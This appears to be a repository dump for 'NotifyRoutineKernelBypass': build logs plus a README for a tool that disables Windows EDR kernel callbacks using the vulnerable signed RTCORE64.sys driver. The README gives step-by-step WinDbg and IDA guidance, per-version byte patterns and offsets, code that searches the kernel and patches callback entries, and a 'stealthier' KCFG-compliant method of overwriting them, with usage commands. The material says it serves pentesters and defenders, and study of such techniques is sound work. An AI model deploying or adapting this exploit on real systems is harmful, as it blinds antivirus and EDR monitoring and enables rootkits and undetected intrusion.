C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\OLE32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\OLEAUT32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\UUID.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\ODBC32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\ODBCCP32.LIB
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINE.OBJ
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMHANDLER.OBJ
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMORY.OBJ
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.OBJ
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\BIN\HOSTX64\X64\C2.DLL
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\LIB\X64\MSVCPRT.LIB
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\LIB\X64\MSVCRT.LIB
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\LIB\X64\OLDNAMES.LIB
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\LIB\X64\VCRUNTIME.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UCRT\X64\UCRT.LIB
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\BIN\HOSTX64\X64\1033\LINKUI.DLL
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\BIN\HOSTX64\X64\CVTRES.EXE
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\VC143.PDB

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/link.secondary.1.tlog`:

```tlog
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMHANDLER.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMORY.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINE.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.OBJ
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\x64\Release\NotifyRoutineKernelBypass.IPDB
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\x64\Release\NotifyRoutineKernelBypass.iobj

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/link.write.1.tlog`:

```tlog
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMHANDLER.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\MEMORY.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINE.OBJ|C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.OBJ
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.EXE
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\X64\RELEASE\NOTIFYROUTINEKERNELBYPASS.PDB

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRoutineKernelBypass.Build.CppClean.log`:

```log
c:\github-vixx\kernel-callback-removal\notifyroutinekernelbypass\x64\release\notifyroutinekernelbypass.pdb
c:\github-vixx\kernel-callback-removal\notifyroutinekernelbypass\x64\release\notifyroutinekernelbypass.exe

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRoutineKernelBypass.exe.recipe`:

```recipe
<?xml version="1.0" encoding="utf-8"?>
<Project>
  <ProjectOutputs>
    <ProjectOutput>
      <FullPath>C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\x64\Release\NotifyRoutineKernelBypass.exe</FullPath>
    </ProjectOutput>
  </ProjectOutputs>
  <ContentFiles />
  <SatelliteDlls />
  <NonRecipeFileRefs />
</Project>
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRoutineKernelBypass.log`:

```log
  notifyRoutine.cpp
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\notifyRoutine.cpp(78,12): warning C4244: 'initializing': conversion from 'DWORD64' to 'int', possible loss of data
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\notifyRoutine.cpp(191,14): warning C4101: 'pEntry': unreferenced local variable
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\notifyRoutine.cpp(263,14): warning C4101: 'pEntry': unreferenced local variable
  MemHandler.cpp
  memory.cpp
C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\NotifyRoutineKernelBypass\memory.cpp(78,29): warning C4267: 'initializing': conversion from 'size_t' to 'DWORD', possible loss of data
  NotifyRoutineKernelBypass.cpp
  Generating code
  Previous IPDB not found, fall back to full compilation.
  All 224 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
  Finished generating code
  NotifyRoutineKernelBypass.vcxproj -> C:\Github-Vixx\kernel-callback-removal\NotifyRoutineKernelBypass\x64\Release\NotifyRoutineKernelBypass.exe

```

`NotifyRoutineKernelBypass/Readme.md`:

```md
# Kernel Notify Callbacks Removal


CheekyBlinder is a project that was developed developed 5 years ago for removing kernel callbacks related to process creation, image load, thread creation, and registry modifications by https://github.com/br-sn.

## Warning

Even though you can download the binaries from the `releases`, you have to make sure that the offsets and the binary search opcodes done is the same on your windows version or you will get a **BLUE SCREEN OF DEATH**

## Major Updates

- Updated the exploit to work on the latest Windows versions.

- Introduced a stealthier method for bypassing kernel callbacks (not publicly disclosed yet, at least not as far as i know).

- Completed the registry callback removal, which was previously non-completed.

- Added step-by-step guidance on modifying the exploit for future or different Windows versions.

- Heavely modified the code to make it reusable for other kernel modifications.

## Prerequisistes

This code is based on the original blog post: [Removing Kernel Callbacks Using Signed Drivers](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/) so i recommend going over the concepts there first.

This is an advanced topic requiring the following prerequisites:

- Assembly understanding

- Familiarity with C programming

- Experience with WinDbg

- Familiarity with IDA

- Windows kernel exploitation knowledge

## Tools Used

WinDbg: [Windows Debugging Tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)

## Kernel Debugging Setup

To debug your local kernel, follow the instructions here: [Setting up local kernel debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)

## Target Audience

This project is for both pentesters and defenders to understand how attackers can bypass EDR kernel implementations.

## Purpose

Tools exist already for example [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) which is great that will do this and more and calculate offsets automaticaly, but this is designed to be small and on point for multiple reasons:

- For everyone to be able to learn how technically bypassing EDR and kernel callback removal is done.
- For having the flexibility to create your own tool which make it pretty easier to bypass signature based detection.
- For researchers to be able to play around the code and debug and reverse.
- Introducing a stealthier way which is not included in EDRSandblast

## New Introduced Method

The public method for bypassing most kernel callbacks involves nulling the entire entry for the driver in the callback table. The new method discussed here is stealthier and modifies the callback function itself while maintaining Kernel Control Flow Guard (KCFG) compliance.

we can overwrite the function itself by a KCFG comppliant function because based on the documentation of [microsoft](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pcreate_process_notify_routine) for setting up a notify routine, the routine doesn't return anything (it's void), so it's easy to find a KCFG compliant function that doesn't do much and even if it returns, the return value is not used.

## Attacker Abuse Cases

An attacker with administrative privileges may attempt to disable EDR or install a rootkit. To interact with the kernel, a signed Microsoft driver is required. Since unsigned drivers cannot be loaded with Microsoft mitigations enabled (e.g., VBS, Hyper-V), attackers typically exploit vulnerable signed drivers that have not been blacklisted.

**NotifyRoutineKernelBypass project uses RTCORE64.sys driver which is not yet blocklisted by MICROSOFT**

## Introduction to Kernel Callbacks

AV vendors and kernel anti-cheat systems register kernel callbacks to monitor system events. These callbacks notify security software of user-mode events, such as process creation.

So the kernel driver will register a callback (for process creation in our example) inside the kernel which will notify the AV / EDR Driver when you create / spawn a new process in usermode.

The kernel uses a callback array / table to save all the callback entries that are registred by the AV / EDR and will be notified when you create a process for example.

**And the callback array is already writable in the kernel, which makes it as well easier for attackers to corrupt it.**

## Process creation kernel callbacks

For process creation callbacks the array is `nt!PspCreateProcessNotifyRoutine` which can be found inside the function `nt!PspSetCreateProcessNotifyRoutine`

<pre>
nt!PspSetCreateProcessNotifyRoutine+0x54:
fffff807`23c1b2dc 488bf8          mov     rdi,rax
fffff807`23c1b2df 4885c0          test    rax,rax
fffff807`23c1b2e2 0f84ae630f00    je      nt!PspSetCreateProcessNotifyRoutine+0xf640e (fffff807`23d11696)
fffff807`23c1b2e8 33db            xor     ebx,ebx
<mark>fffff807`23c1b2ea 4c8d2d0f124f00  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff807`2410c500)]</mark>
fffff807`23c1b2f1 488d0cdd00000000 lea     rcx,[rbx*8]
fffff807`23c1b2f9 4533c0          xor     r8d,r8d
fffff807`23c1b2fc 4903cd          add     rcx,r13
</pre>

And now we can access the entries in the callback array as follow:

<pre>
lkd> dq nt!PspCreateProcessNotifyRoutine
fffff807`2410c500  ffff800e`5beb7b4f ffff800e`5c7f725f
fffff807`2410c510  ffff800e`5c7f758f ffff800e`5c7f7a9f
fffff807`2410c520  ffff800e`5cdd5c2f ffff800e`5cdd652f
fffff807`2410c530  ffff800e`5cdd6a9f ffff800e`5e896edf
fffff807`2410c540  ffff800e`5e1ab33f ffff800e`5e1adf4f
fffff807`2410c550  00000000`00000000 00000000`00000000
fffff807`2410c560  00000000`00000000 00000000`00000000
fffff807`2410c570  00000000`00000000 00000000`00000000
</pre>

Each one of these entries are a callback registred by an EDR sys driver, lets take the second entry as an example <mark>ffff800e`5c7f725f</mark>

First we need to remove the last byte and null it out (The last 4 bits of these pointer addresses are insignificant), to access the callback entry structure.

<pre>
lkd> ? (ffff800e`5c7f725f >> 4) << 4
Evaluate expression: -140675806956976 = ffff800e`5c7f725<mark>0</mark>
lkd> dq ffff800e`5c7f7250 L4
ffff800e`5c7f7250  00000000`00000020 <mark>fffff807`252e9b70</mark>
ffff800e`5c7f7260  00000000`00000006 00000000`00000000
lkd> u fffff807`252e9b70 L3
<mark>WdFilter!MpCreateProcessNotifyRoutineEx:</mark>
fffff807`252e9b70 48895c2410      mov     qword ptr [rsp+10h],rbx
fffff807`252e9b75 48894c2408      mov     qword ptr [rsp+8],rcx
fffff807`252e9b7a 55              push    rbp
</pre>

The second entry which is <mark>fffff807`252e9b70</mark> is one of the functions that will be called when you create a process (WdFilter driver is related to windows defender). and this is only one of the callback entries.

So in the original cheeckyblinder project what he did is he nulled the whole entry in the callback table which is this one <mark>ffff800e`5c7f725f</mark>, so using a R/W primitive kernel exploit we can null the entry, and this is what the callback table looks like after nulling it out.

<pre>
lkd> dq nt!PspCreateProcessNotifyRoutine
fffff807`2410c500  ffff800e`5beb7b4f <mark>00000000`00000000</mark>
fffff807`2410c510  ffff800e`5c7f758f ffff800e`5c7f7a9f
fffff807`2410c520  ffff800e`5cdd5c2f ffff800e`5cdd652f
fffff807`2410c530  ffff800e`5cdd6a9f ffff800e`5e896edf
fffff807`2410c540  ffff800e`5e1ab33f ffff800e`5e1adf4f
fffff807`2410c550  00000000`00000000 00000000`00000000
fffff807`2410c560  00000000`00000000 00000000`00000000
fffff807`2410c570  00000000`00000000 00000000`00000000
</pre>

but what I did is, instead of nulling the whole entry, I changed the function in the callback array to another one that just returns but it has to be KCFG compliant.

`nt!KeGetCurrentIrql` is a KCFG valid function that just technicaly just returns.

<pre>
lkd> dq nt!PspCreateProcessNotifyRoutine
fffff807`2410c500  ffff800e`5beb7b4f <mark>ffff9b02`251f6dff</mark>
fffff807`2410c510  ffff800e`5c7f758f ffff800e`5c7f7a9f
fffff807`2410c520  ffff800e`5cdd5c2f ffff800e`5cdd652f
fffff807`2410c530  ffff800e`5cdd6a9f ffff800e`5e896edf
fffff807`2410c540  ffff800e`5e1ab33f ffff800e`5e1adf4f
fffff807`2410c550  00000000`00000000 00000000`00000000
fffff807`2410c560  00000000`00000000 00000000`00000000
fffff807`2410c570  00000000`00000000 00000000`00000000
lkd> dq ffff9b02`251f6df0 L2
ffff9b02`251f6df0  00000000`00000020 <mark>fffff804`8fdea060</mark>
lkd> u fffff804`8fdea060 L2
<mark>nt!KeGetCurrentIrql:</mark>
fffff804`8fdea060 440f20c0        mov     rax,cr8
fffff804`8fdea064 c3              ret
</pre>

As you can see, instead of nulling the whole callback entry => we just changed the function inside the entry to KeGetCurrentIrql which will do nothing leading to bypassing what ever the AV / EDR was checking.

**And if EDR was monitoring the callback entry itself if it's null or not, this will bypass that monitoring technique.**

## What is KCFG
KCFG (Control Flow Guard) is a security feature related to Control Flow Guard (CFG), which is designed to protect software from certain types of attacks, particularly control flow hijacking attacks (e.g., buffer overflows, return-oriented programming or ROP attacks). It was first introduced by Microsoft to prevent these attacks by ensuring that execution of code only occurs at valid locations.

So All indirect calls (call rax for example) will be replaced and verified by KCFG like below.

<pre>
lkd> u FLTMGR!FltDoCompletionProcessingWhenSafe+0x77
FLTMGR!FltDoCompletionProcessingWhenSafe+0x77:
fffff807`1ee01567 488bcd          mov     rcx,rbp
fffff807`1ee0156a bf01000000      mov     edi,1
<mark>fffff807`1ee0156f ff1583450300    call    qword ptr [FLTMGR!_guard_dispatch_icall_fptr (fffff807`1ee35af8)]</mark>
fffff807`1ee01575 8bd8            mov     ebx,eax
fffff807`1ee01577 41891e          mov     dword ptr [r14],ebx
fffff807`1ee0157a 408ac7          mov     al,dil
fffff807`1ee0157d 488b5c2450      mov     rbx,qword ptr [rsp+50h]
fffff807`1ee01582 488b6c2458      mov     rbp,qword ptr [rsp+58h]
lkd> dqs FLTMGR!_guard_dispatch_icall_fptr L1
fffff807`1ee35af8  fffff807`23820170 <mark>nt!guard_dispatch_icall</mark>
lkd> u fffff807`23820170
nt!guard_dispatch_icall:
<mark>fffff807`23820170 4c8b1d89179e00  mov     r11,qword ptr [nt!guard_icall_bitmap (fffff807`24201900)]</mark>
fffff807`23820177 4885c0          test    rax,rax
</pre>

The real function which we want to call will be loaded into rax and KCFG (nt!guard_dispatch_icall) will be called, which will verify that the function inside rax is a valid function through a bitmap using the following process (the process is inside nt!guard_dispatch_icall).

The calculation are based on the function `nt!KeGetCurrentIrql`, because this is the function that we are going to end up calling.

<pre>
lkd> ? nt!KeGetCurrentIrql >> 9 (Will be used as Index)
Evaluate expression: 36028779900694815 = 007ffffc`03abf11f

lkd> ? (nt!KeGetCurrentIrql >> 3) mod 40 (BitToCheck)
Evaluate expression: 54 = 00000000`00000036

lkd> dqs nt!guard_icall_bitmap L1
fffff807`58a01900  fbffa8d7`9452c248

lkd> dqs fbffa8d7`9452c248 + 007ffffc`03abf11f (Index) * 0x08 L1 (Entry)
ffffa8b7`b1b24b40  00410004`00004400

lkd> .formats 00410004`00004400
Evaluate expression:
Binary:  00000000 0<mark>1</mark>000001 00000000 00000100 00000000 00000000 01000100 00000000
</pre>

The `BitToCheck` which in our case is the bit 54 needs to be `1`, if it's `1` it means the call is valid which is the case for `KeGetCurrentIrql`.

So the plan is to replace the function pointing to the AV function to be called (`fffff807252e9b70`) to KeGetCurrentIrql (`fffff80723623fb0`) which will render the entry useless.

<pre>
lkd> u KeGetCurrentIrql L2
<mark>nt!KeGetCurrentIrql:</mark>
<mark>fffff807`23623fb0</mark> 440f20c0        mov     rax,cr8
fffff807`23623fb4 c3              ret
lkd> dq ffff800e`5c7f7250 L4
ffff800e`5c7f7250  00000000`00000020 <mark><del>fffff807`252e9b70</del></mark>
ffff800e`5c7f7260  00000000`00000006 00000000`00000000
lkd> eq ffff800e`5c7f7258 fffff807`23623fb0
lkd> dq ffff800e`5c7f7250 L4
ffff800e`5c7f7250  00000000`00000020 <mark>fffff807`23623fb0</mark>
ffff800e`5c7f7260  00000000`00000006 00000000`00000000
lkd> u fffff807`252e9b70 L2
<mark>WdFilter!MpCreateProcessNotifyRoutineEx:</mark>
<mark>fffff805`55e99b70</mark> 48895c2410      mov     qword ptr [rsp+10h],rbx
fffff805`55e99b75 48894c2408      mov     qword ptr [rsp+8],rcx
</pre>

## How to Fix the code to work on your windows version (process creation callback first)

### Fixing the bytes for the byte search for your windows OS

The change needs to be done on both `findprocesscallbackroutine` and `findprocesscallbackroutinestealth`

`findprocesscallbackroutinestealth` is the function that i introduced which will modify the function inside the entry.

`findprocesscallbackroutine` is the original function from the original exploit which will null out the entry.

The original code will do a `byte search` to find the location of the function that is using the callback table (`nt!PspSetCreateProcessNotifyRoutine`) starting from a exported function close to it. 

First you need double check the bytes did not change for your windows OS.

<pre>
struct Offsets {
    <mark>DWORD64 process;</mark>
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
};

struct Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer) {
        //case 1903:
    case 1909:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2004:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2009:
        return { <mark>0x7340fe8341f63345</mark>, 0x8d48d68b48c03345, 0x48d90c8d48c03345, 0x4024448948f88b48 };
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");

    }

}
</pre>

The first DWORD is the callback related to the process creation and it contains the bytes that the program will search for.

 we know that the function `nt!PspSetCreateProcessNotifyRoutine` is using the callback array.

The idea is to find some bytes close to the `lea` command that is using the callback array we are interested in, and the bytes that we will use, they need to be static so we can rely on them for byte searching and not change after each reboot.

<pre>
lkd> u nt!PspSetCreateProcessNotifyRoutine L20
nt!PspSetCreateProcessNotifyRoutine:
fffff800`a4e61fd0 48895c2408      mov     qword ptr [rsp+8],rbx
fffff800`a4e61fd5 48896c2410      mov     qword ptr [rsp+10h],rbp
fffff800`a4e61fda 4889742418      mov     qword ptr [rsp+18h],rsi
fffff800`a4e61fdf 57              push    rdi
fffff800`a4e61fe0 4154            push    r12
fffff800`a4e61fe2 4155            push    r13
fffff800`a4e61fe4 4156            push    r14
fffff800`a4e61fe6 4157            push    r15
fffff800`a4e61fe8 4883ec20        sub     rsp,20h
fffff800`a4e61fec 8bf2            mov     esi,edx
fffff800`a4e61fee 8bda            mov     ebx,edx
fffff800`a4e61ff0 83e602          and     esi,2
fffff800`a4e61ff3 4c8bf9          mov     r15,rcx
fffff800`a4e61ff6 f6c201          test    dl,1
fffff800`a4e61ff9 0f8487000000    je      nt!PspSetCreateProcessNotifyRoutine+0xb6 (fffff800`a4e62086)
fffff800`a4e61fff 65488b2c2588010000 mov   rbp,qword ptr gs:[188h]
<mark>fffff800`a4e62008 4c8d2d712a4a00  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff800`a5304a80)]</mark>
fffff800`a4e6200f 83c8ff          or      eax,0FFFFFFFFh
fffff800`a4e62012 660185e4010000  add     word ptr [rbp+1E4h],ax
fffff800`a4e62019 90              nop
<mark>fffff800`a4e6201a 4533f6          xor     r14d,r14d
fffff800`a4e6201d 4183fe40        cmp     r14d,40h
fffff800`a4e62021 7338            jae     nt!PspSetCreateProcessNotifyRoutine+0x8b (fffff800`a4e6205b)</mark>
fffff800`a4e62023 4e8d24f500000000 lea     r12,[r14*8]
</pre>

And so the bytes that we can use for example is the highlighed ones starting from xor, but we need to write them in the c variable in reverse (little endian arch) which is `0x7340fe8341f63345`.

<pre>
lkd> dq ffffff800`a4e6201a L1
fffff800`a4e6201a  7340fe83`41f63345
</pre>

### Fixing the offset
Next we need to fix the offset, to be able to extract and calculate the address of the callback array.

<pre>
void notifyRoutine::findprocesscallbackroutine(DWORD64 remove) {

	//we search the memory between PoRegisterCoalescingCallback and EtwWriteEndScenario for a specific set of instructions next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
	Offsets offsets = getVersionOffsets();
	const DWORD64 IoDeleteSymbolicLink = GetFunctionAddress("IoDeleteSymbolicLink");
	const DWORD64 RtlDestroyHeap = GetFunctionAddress("RtlDestroyHeap");

	//the address returned by the patternsearch is just below the offsets. 
	DWORD64 patternaddress = PatternSearch(IoDeleteSymbolicLink, RtlDestroyHeap, offsets.process);
	Log("[+] patternaddress: %p", patternaddress);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - <mark>0x0f</mark>,
		&offset,
		sizeof(offset)
	);

	//so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - <mark>0x0f</mark> + 0x04;
  ....................
}
</pre>

Looking at this piece of code, we will see that after the byte search we will get the patternaddress which will be pointing to the xor command `fffff800a4e6201a`.
We need to substract from it an offset to make it point to the 4-byte relative offset of the array which is `712a4a00` in reverse at `fffff800a4e6200b`.

<pre>
lkd> dd fffff800`a4e6200b L1
fffff800`a4e6200b  004a2a71
</pre>

so we need to substract `0xf` from the pattern address.

<pre>
lkd> dd fffff800`a4e6200b L1
fffff800`a4e6200b  004a2a71
lkd> ? fffff800`a4e6201a - fffff800`a4e6200b
Evaluate expression: 15 = 00000000`0000000f
</pre>

### Fixing the functions
`nt!PspSetCreateProcessNotifyRoutine` is not an exported function, so we cannot get the address of the function directly in our c code.
We need to start the byte search using a function that is exported and close to `nt!PspSetCreateProcessNotifyRoutine`.

the functions needs to be exported to be able to use GetProcAddress and GetModuleHandle on them and get the function address.

So To find the closest exported functions (start and end) to use in our code as a starting point for the byte search, we can use IDA.

First let's get the offset to the function from the nt base

<pre>
lkd> ? nt!PspSetCreateProcessNotifyRoutine - nt
Evaluate expression: 8499848 = <mark>00000000`00a61fd0</mark>
</pre>

Then copy the `ntoskrnl.exe` from `c:/windows/system32` to open it in IDA.

Then in IDA, first of all we rebase the IMAGEBASE to 0x00, to make the offsets we get in `windbg` from the nt base the actual address in IDA, without any additional calculations.

![IDA Rebase](./screenshots/RebaseProgram.png)

![IDA Rebase](./screenshots/Rebasev2.png)

Next we go the `Export table` in IDA and reorder all the functions by `address`.

Note: It will take some time for the addresses in the export table to be refreshed after the rebase.

And then you have to pick 2 functions where `0000000000a61fd0` which is the address of `nt!PspSetCreateProcessNotifyRoutine` is between them.

As you can, from the screenshot `IoDeleteSymbolicLink` and `RtlDestroyHeap` are the start and end functions that i will be using as `nt!PspSetCreateProcessNotifyRoutine` falls in between, so i can use `IoDeleteSymbolicLink` as the start of the byte search.

![Export Table](./screenshots/ExportTable.png)

### Rest of the code

and the rest of the code is looping thourght the callback array that we just found, and nulling the entry or replacing the function in the entry depending on what function you are using.

```
/delproc <address> - Remove Process Creation Callback
/delprocstealth <address> - overwriting the Process Creation function Callback
```

You can check the [Cheeckyblinder Blog](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/) for more info about the code.

## Thread Callback
When creating a new thread, each entry in the callback array that was registred by the EDR will be called.

Same steps as we did for the process callback, it's just a different callback function and callback array for the thread related actions.

The function is called `nt!PspSetCreateThreadNotifyRoutine` which is using the thread callback array `nt!PspCreateThreadNotifyRoutine`

<pre>
lkd> u nt!PspSetCreateThreadNotifyRoutine L12
nt!PspSetCreateThreadNotifyRoutine:
fffff800`a4b54b18 48895c2408      mov     qword ptr [rsp+8],rbx
fffff800`a4b54b1d 4889742410      mov     qword ptr [rsp+10h],rsi
fffff800`a4b54b22 57              push    rdi
fffff800`a4b54b23 4883ec20        sub     rsp,20h
fffff800`a4b54b27 8bf2            mov     esi,edx
fffff800`a4b54b29 8bd2            mov     edx,edx
fffff800`a4b54b2b e8807f3000      call    nt!ExAllocateCallBack (fffff800`a4e5cab0)
fffff800`a4b54b30 488bf8          mov     rdi,rax
fffff800`a4b54b33 4885c0          test    rax,rax
fffff800`a4b54b36 746f            je      nt!PspSetCreateThreadNotifyRoutine+0x8f (fffff800`a4b54ba7)
fffff800`a4b54b38 33db            xor     ebx,ebx
fffff800`a4b54b3a 83fb40          cmp     ebx,40h
fffff800`a4b54b3d 735e            jae     nt!PspSetCreateThreadNotifyRoutine+0x85 (fffff800`a4b54b9d)
<mark>fffff800`a4b54b3f 488d0d3afd7a00  lea     rcx,[nt!PspCreateThreadNotifyRoutine (fffff800`a5304880)]</mark>
<mark>fffff800`a4b54b46 4533c0          xor     r8d,r8d
fffff800`a4b54b49 488d0cd9        lea     rcx,[rcx+rbx*8]
fffff800`a4b54b4d 488bd7          mov     rdx,rdi</mark>
fffff800`a4b54b50 e8774ac6ff      call    nt!ExCompareExchangeCallBack (fffff800`a47b95cc)
</pre>

The bytes will be `0x48d90c8d48c03345` and we need to substract `0x04` to get to the relative offset address of the callback array which is `007afd3a` and read it.

<pre>
lkd> dq fffff800`a4b54b46 L1
fffff800`a4b54b46  48d90c8d`48c03345
</pre>

<pre>
struct Offsets {
    DWORD64 process;
    DWORD64 image;
    <mark>DWORD64 thread;</mark>
    DWORD64 registry;
};

struct Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer) {
        //case 1903:
    case 1909:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2004:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2009:
        return { 0x7340fe8341f63345, 0x8d48d68b48c03345, <mark>0x48d90c8d48c03345</mark>, 0x4024448948f88b48 };
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");

    }

}
</pre>

Using the same method as the process callback we need to find 2 functions close to `PspSetCreateThreadNotifyRoutine` for the bytes searching.

<pre>
lkd> ? nt!PspSetCreateThreadNotifyRoutine - nt
Evaluate expression: 7686936 = 00000000`00754b18
</pre>

![Export Table](./screenshots/ExportTableThread.png)

## Image Callback

The function is `nt!PsSetLoadImageNotifyRoutineEx`

<pre>
lkd> u nt!PsSetLoadImageNotifyRoutineEx L15
nt!PsSetLoadImageNotifyRoutineEx:
fffff800`a4e5c970 48895c2408      mov     qword ptr [rsp+8],rbx
fffff800`a4e5c975 48896c2410      mov     qword ptr [rsp+10h],rbp
fffff800`a4e5c97a 4889742418      mov     qword ptr [rsp+18h],rsi
fffff800`a4e5c97f 57              push    rdi
